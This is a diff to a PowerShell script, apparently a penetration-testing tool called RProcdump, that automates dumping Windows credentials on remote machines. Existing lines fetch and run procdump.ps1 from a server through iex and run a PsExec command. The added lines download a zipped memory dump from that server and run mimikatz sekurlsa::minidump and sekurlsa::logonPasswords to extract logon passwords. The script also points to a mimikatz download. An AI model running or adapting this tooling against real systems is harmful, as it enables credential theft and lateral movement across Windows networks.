@@ -9,6 +9,9 @@ Help:
  Author: @ThebenyGreen
   - EyesOpenSecurity
 #>
+Write-Host "RProcdump - @TheBenyGreen" -ForegroundColor DarkGreen;
+Write-Host "Remote Windows credentials dump process automation. "
+Write-Host "----------------------------------------------------"
 
 Function RProcdump {
 	[CmdletBinding()] param( 
@@ -60,6 +63,21 @@ iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
 		}
 	}
 PsexecCommand
-echo "Open dump file with Mimikatz to retrieve the creds -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords"
-}
 
+Write-Host "If Dumps have been uploaded"
+Write-Host "You can it manually : Open dump file with Mimikatz to retrieve the creds ->  mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
+Write-Host "OR you can try it automately"
+$a = Read-Host "Do you want to try it automately ? (o/y):"
+if ($a -eq "y") {
+	$dump = Read-Host "URL of zipped dump file to download (PC.zip) :"
+	$URL = "$server/$dump"
+	$File = "$env:userprofile\AppData\$dump"
+	(New-Object System.Net.WebClient).DownloadFile($URL, $File)
+	.\mimikatz.exe sekurlsa::minidump $dump
+	.\mimikatz.exe sekurlsa::logonPasswords
+	}
+else { 
+	Write-Host "Ok, you will do it manually with -> mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
+	Write-Host "Download Mimikatz: https://github.com/gentilkiwi/mimikatz/releases"
+	}
+}
